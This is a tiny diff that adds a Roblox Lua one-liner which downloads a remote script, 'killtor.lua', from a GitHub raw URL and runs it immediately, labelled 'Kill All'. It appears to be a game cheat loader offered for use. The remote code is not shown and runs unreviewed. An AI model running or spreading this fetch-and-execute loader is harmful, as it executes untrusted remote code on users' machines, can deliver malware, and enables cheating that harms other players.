@@ -1,0 +1,3 @@
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/zeeywashere/scripts/refs/heads/main/killtor.lua"))()
+Kill All
